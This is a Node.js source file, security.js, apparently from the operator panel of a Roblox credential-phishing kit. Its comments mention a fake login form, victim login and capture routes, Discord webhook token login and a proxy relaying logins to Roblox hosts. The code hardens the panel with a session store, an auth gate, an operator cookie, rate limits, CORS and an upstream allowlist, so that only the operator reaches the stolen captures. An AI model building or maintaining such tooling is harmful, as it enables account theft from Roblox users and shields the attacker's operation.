// c:\Users\acedi\OneDrive\Desktop\New folder\security.js
// JavaScript / security.js / Node.js 18+ / auth gate, rate limits, escaping, atomic writes

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ── Session store ──
// express-session's MemoryStore leaks and dies on restart. This is a file-backed
// store with the same interface and no extra dependencies.
//
// Writes are coalesced. `rolling: true` makes express-session call set() on every
// authenticated request, and a synchronous serialise + write of the whole store
// per request is a blocking-I/O ceiling on the whole panel. The in-memory map is
// authoritative; the file catches up on a short debounce. A hard process death
// inside the debounce window costs at most the last few session touches.

class JsonSessionStore extends require('express-session').Store {
    constructor(file, ttlMs = 7 * 24 * 60 * 60 * 1000) {
        super();
        this.file = file;
        this.ttlMs = ttlMs;
        this.sessions = readJson(file, {});
        this.flushTimer = null;
        this.dirty = false;
        this.sweep();
        this.timer = setInterval(() => this.sweep(), 15 * 60 * 1000);
        if (this.timer.unref) this.timer.unref();
    }

    sweep() {
        const now = Date.now();
        let changed = false;
        for (const [sid, s] of Object.entries(this.sessions)) {
            const expires = s && s.cookie && s.cookie.expires ? Date.parse(s.cookie.expires) : 0;
            if (expires && expires < now) { delete this.sessions[sid]; changed = true; }
        }
        if (changed) this.persist();
    }

    // Coalesce bursts. 50ms is short enough that a response leaving the door
    // after set() still lands, long enough that a page load with six API calls
    // rewrites the file once.
    schedulePersist() {
        this.dirty = true;
        if (this.flushTimer) return;
        this.flushTimer = setTimeout(() => {
            this.flushTimer = null;
            if (!this.dirty) return;
            this.dirty = false;
            this.persist();
        }, 50);
        if (this.flushTimer.unref) this.flushTimer.unref();
    }

    persist() {
        this.dirty = false;
        writeJsonAtomic(this.file, this.sessions);
    }

    get(sid, cb) {
        const s = this.sessions[sid];
        if (!s) return cb(null, null);
        const expires = s.cookie && s.cookie.expires ? Date.parse(s.cookie.expires) : 0;
        if (expires && expires < Date.now()) {
            delete this.sessions[sid];
            this.persist();
            return cb(null, null);
        }
        cb(null, s);
    }

    set(sid, sess, cb) {
        this.sessions[sid] = sess;
        this.schedulePersist();
        if (cb) cb(null);
    }

    destroy(sid, cb) {
        delete this.sessions[sid];
        this.schedulePersist();
        if (cb) cb(null);
    }

    touch(sid, sess, cb) {
        this.sessions[sid] = sess;
        // Rolling sessions refresh cookie.expires on read. Without a persist the
        // refreshed expiry is lost on restart and the session dies early.
        this.schedulePersist();
        if (cb) cb(null);
    }
}

// ── Startup secret validation ──
// A fallback secret is the same as no secret: anyone holding the source forges
// a signed cookie. Fail loudly at boot instead of shipping a known key.

function assertEnv(names) {
    const missing = names.filter(n => !process.env[n] || String(process.env[n]).trim() === '');
    if (missing.length) {
        console.error(`[FATAL] Missing required environment variable(s): ${missing.join(', ')}`);
        console.error('[FATAL] Copy .env.example to .env and fill every value before starting.');
        process.exit(1);
    }
}

// ── Auth gate ──
// Anything that reads captured data or writes operator configuration goes
// through here. The public 'guest' identity is not a session.

const GUEST_ID = 'public';

function isAuthenticated(req) {
    const u = req.session && req.session.user;
    return Boolean(u && u.id && u.id !== GUEST_ID);
}

function requireAuth(req, res, next) {
    if (isAuthenticated(req)) return next();
    return res.status(401).json({ error: 'authentication required' });
}

// Prefixes an anonymous visitor is allowed to reach. Everything else under
// /api is gated. Explicit, so a new route is protected by default.
const PUBLIC_API_PREFIXES = [
    '/api/auth',
    '/api/capture-login',
    '/api/roblox',
    '/api/game',
    '/api/games',
    '/api/profiles',
    '/api/profile',
    '/api/communities',
    '/api/community',
    '/api/sites',
    '/api/templates',
    '/api/user',
    '/api/login-state',
    '/api/op',
    '/api/webhook/login-with-token',
    '/api/webhook/recover',
    '/api/webhook/status',
    '/api/webhook/save',
    '/api/webhook/regenerate',
    '/api/client-error'
];

// Read-only public surface. Writes under these prefixes still need a session.
const PUBLIC_READ_METHODS = new Set(['GET', 'HEAD', 'OPTIONS']);

// A request that arrives over loopback is the operator at the bench, not a
// stranger — but only when it really arrived over loopback. Behind Apache/Vercel
// every request carries X-Forwarded-For, and `req.ip` then reflects whatever the
// proxy chain claims. Treating that as local made `X-Forwarded-For: 127.0.0.1`
// a full read of every capture. A proxy-marked request never qualifies; it must
// carry a session or the operator cookie.
const PROXY_HEADERS = ['x-forwarded-for', 'x-real-ip', 'forwarded', 'cf-connecting-ip', 'x-vercel-forwarded-for'];

function isLoopbackAddress(raw) {
    const ip = String(raw || '').replace(/^::ffff:/, '');
    return ip === '127.0.0.1' || ip === '::1' || ip === 'localhost' || ip.startsWith('127.');
}

function isTrustedLocal(req) {
    if (!req) return false;
    if (PROXY_HEADERS.some(h => req.get && req.get(h))) return false;
    const ip = req.ip || (req.socket && req.socket.remoteAddress) || '';
    if (!isLoopbackAddress(ip)) return false;
    // The socket itself must be loopback too. `req.ip` alone is derived from the
    // proxy chain; the socket is the peer that actually connected.
    const peer = req.socket && req.socket.remoteAddress;
    return !peer || isLoopbackAddress(peer);
}

// ── Operator cookie ──
// Loopback trust is fragile behind a proxy, and DASHBOARD_OPEN=true is a public
// panel. OPERATOR_KEY is the portable door: /?key=<key> sets a signed, httpOnly
// cookie and the panel opens. The raw key never lands in the cookie.

const OPERATOR_COOKIE = 'op';
const OPERATOR_TTL_MS = 12 * 60 * 60 * 1000;

function operatorCookieValue() {
    const key = String(process.env.OPERATOR_KEY || '');
    if (!key) return null;
    return crypto.createHmac('sha256', String(process.env.SESSION_SECRET || 'operator'))
        .update(`operator:${key}`)
        .digest('hex');
}

function timingSafeEqualHex(a, b) {
    const ba = Buffer.from(String(a || ''), 'hex');
    const bb = Buffer.from(String(b || ''), 'hex');
    if (ba.length === 0 || ba.length !== bb.length) return false;
    try { return crypto.timingSafeEqual(ba, bb); } catch { return false; }
}

function hasOperatorCookie(req) {
    const expected = operatorCookieValue();
    if (!expected) return false;
    return timingSafeEqualHex(req.cookies ? req.cookies[OPERATOR_COOKIE] : readCookieHeader(req, OPERATOR_COOKIE), expected);
}

function readCookieHeader(req, name) {
    const raw = String((req.get && req.get('cookie')) || '');
    if (!raw) return '';
    for (const part of raw.split(';')) {
        const idx = part.indexOf('=');
        if (idx === -1) continue;
        if (part.slice(0, idx).trim() === name) return part.slice(idx + 1).trim();
    }
    return '';
}

function setOperatorCookie(res) {
    const value = operatorCookieValue();
    if (!value) return false;
    res.cookie(OPERATOR_COOKIE, value, {
        httpOnly: true,
        sameSite: 'lax',
        secure: process.env.VERCEL === undefined ? false : true,
        maxAge: OPERATOR_TTL_MS,
        path: '/'
    });
    return true;
}

// Is this request allowed to touch operator data without a Discord session?
// Order: a real session wins, then the operator cookie, then an actual loopback
// request with no proxy headers. DASHBOARD_OPEN=true is deliberately not part of
// this decision any more — it opens the page, not the capture store.
function isOperatorAuthorized(req) {
    if (isAuthenticated(req)) return true;
    if (hasOperatorCookie(req)) return true;
    return isTrustedLocal(req);
}

function validateOperatorKey(candidate) {
    const key = String(process.env.OPERATOR_KEY || '');
    if (!key) return false;
    const a = crypto.createHash('sha256').update(String(candidate || '')).digest();
    const b = crypto.createHash('sha256').update(key).digest();
    try { return crypto.timingSafeEqual(a, b); } catch { return false; }
}

// Prefix match that respects path segments: '/api/auth' matches '/api/auth' and
// '/api/auth/login', never '/api/authorize'.
function matchesPrefix(pathname, prefixes) {
    return prefixes.some(p => pathname === p || pathname.startsWith(p + '/'));
}

function apiGuard(req, res, next) {
    // app.use('/api', apiGuard) trims the mount from req.path, so a request for
    // /api/auth/login arrives here as '/auth/login' and every prefix test used
    // to miss — which 401'd the whole public surface, victim login included.
    // originalUrl still carries the full path.
    const pathname = String(req.originalUrl || req.url || '').split('?')[0];

    // Victim-facing and catalog routes: the login page calls these before any
    // session exists. Reads are free, writes are not, except where noted.
    if (matchesPrefix(pathname, PUBLIC_API_PREFIXES)) {
        const writeExempt = ['/api/auth', '/api/capture-login', '/api/client-error', '/api/webhook/recover',
            '/api/webhook/login-with-token', '/api/op'];
        if (PUBLIC_READ_METHODS.has(req.method) || matchesPrefix(pathname, writeExempt)) return next();
        if (isOperatorAuthorized(req)) return next();
        return requireAuth(req, res, next);
    }

    // Everything else — hits, signins, visits, stats, the proxy pool, the
    // tenant admin surface — carries captured data or operator configuration.
    // A signed-in operator, the operator cookie, or a genuine loopback request.
    if (isOperatorAuthorized(req)) return next();
    return requireAuth(req, res, next);
}

// ── Rate limiting ──
// Fixed window, in-process. Good enough for one box; swap for Redis if the
// process ever goes multi-instance.

const buckets = new Map();

function rateLimit(key, limit = 30, windowMs = 60_000) {
    const now = Date.now();
    let b = buckets.get(key);
    if (!b || now > b.reset) {
        b = { n: 0, reset: now + windowMs };
        buckets.set(key, b);
    }
    b.n += 1;
    if (buckets.size > 50_000) {
        for (const [k, v] of buckets) if (now > v.reset) buckets.delete(k);
    }
    return b.n <= limit;
}

function rateLimitMiddleware(name, limit, windowMs) {
    return (req, res, next) => {
        const key = `${name}:${req.ip}`;
        if (!rateLimit(key, limit, windowMs)) {
            res.setHeader('Retry-After', Math.ceil(windowMs / 1000));
            return res.status(429).json({ error: 'too many requests' });
        }
        next();
    };
}

// ── Field sanitising ──
// Every value that comes off a fake login form is attacker-controlled and
// lands in JSON, HTML and a Discord embed. Cap length, strip control chars,
// coerce type.

function field(value, max = 256) {
    if (value === undefined || value === null) return '';
    return String(value)
        .replace(/[\u0000-\u001f\u007f]/g, '')
        .slice(0, max);
}

function int(value, fallback = 0) {
    const n = Number(value);
    return Number.isFinite(n) ? Math.trunc(n) : fallback;
}

// ── HTML escaping ──
// Server for templates, and a matching client helper lives in dashboard.js.

const HTML_ESCAPES = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#39;'
};

function escapeHtml(value) {
    return String(value === undefined || value === null ? '' : value)
        .replace(/[&<>"']/g, ch => HTML_ESCAPES[ch]);
}

// ── Atomic JSON persistence ──
// writeFileSync straight onto the live file truncates it if the process dies
// mid-write. Write a sibling temp and rename, which is atomic on NTFS and ext4.

function writeJsonAtomic(file, data) {
    const tmp = `${file}.${process.pid}.${Date.now()}.tmp`;
    try {
        fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
        fs.renameSync(tmp, file);
        return true;
    } catch (err) {
        try { if (fs.existsSync(tmp)) fs.unlinkSync(tmp); } catch {}
        console.error(`[STORE] atomic write failed for ${path.basename(file)}:`, err.message);
        return false;
    }
}

function readJson(file, fallback) {
    try {
        if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
    } catch (err) {
        console.error(`[STORE] read failed for ${path.basename(file)}:`, err.message);
    }
    return fallback;
}

// ── CORS ──
// Reflecting Origin with credentials enabled lets any site drive the auth
// proxy as the operator. Allowlist, then echo only on a match.

function corsFor(origin, allowed) {
    if (origin && allowed.has(origin)) return origin;
    return null;
}

function applyCors(req, res, allowed) {
    const origin = corsFor(req.get('origin'), allowed);
    if (!origin) return false;
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
    return true;
}

// ── Upstream allowlist ──
// The Roblox proxy used to take the host from the path, which made it a relay
// to anything the server could reach — link-local metadata, 127.0.0.1, internal
// services. The host still comes from the path, but it now has to be a Roblox
// host. Suffix match rather than a fixed list: the login page's bundle resolves
// hosts at runtime and a list that is one entry short silently downgrades a
// real handshake into a blind proxy.

const ALLOWED_UPSTREAM_SUFFIXES = ['.roblox.com', '.rbxcdn.com'];

const ALLOWED_UPSTREAM_HOSTS = new Set([
    'auth.roblox.com',
    'www.roblox.com',
    'apis.roblox.com',
    'twostepverification.roblox.com',
    'twofactorauth.roblox.com',
    'users.roblox.com',
    'friends.roblox.com',
    'thumbnails.roblox.com',
    'presence.roblox.com',
    'badges.roblox.com',
    'avatar.roblox.com',
    'accountsettings.roblox.com',
    'accountinformation.roblox.com',
    'economy.roblox.com',
    'groups.roblox.com',
    'games.roblox.com',
    'catalog.roblox.com',
    'notifications.roblox.com',
    'locale.roblox.com',
    'chat.roblox.com',
    'inventory.roblox.com',
    'assetdelivery.roblox.com',
    'develop.roblox.com',
    'ab-testing.roblox.com',
    'metrics.roblox.com',
    'lms.roblox.com',
    'voice.roblox.com',
    'realtime.roblox.com'
]);

function isAllowedUpstreamHost(hostname) {
    const host = String(hostname || '').toLowerCase();
    if (!host) return false;
    if (ALLOWED_UPSTREAM_HOSTS.has(host)) return true;
    return ALLOWED_UPSTREAM_SUFFIXES.some(s => host.endsWith(s) && host.length > s.length);
}

function resolveUpstream(raw) {
    let url;
    try { url = new URL(raw); } catch { return null; }
    if (url.protocol !== 'https:') return null;
    if (!isAllowedUpstreamHost(url.hostname)) return null;
    if (url.port && url.port !== '443') return null;
    return url;
}

module.exports = {
    GUEST_ID,
    JsonSessionStore,
    assertEnv,
    isAuthenticated,
    isTrustedLocal,
    isOperatorAuthorized,
    hasOperatorCookie,
    setOperatorCookie,
    validateOperatorKey,
    OPERATOR_COOKIE,
    OPERATOR_TTL_MS,
    requireAuth,
    apiGuard,
    rateLimit,
    rateLimitMiddleware,
    field,
    int,
    escapeHtml,
    writeJsonAtomic,
    readJson,
    corsFor,
    applyCors,
    resolveUpstream,
    isAllowedUpstreamHost,
    ALLOWED_UPSTREAM_HOSTS,
    ALLOWED_UPSTREAM_SUFFIXES
};
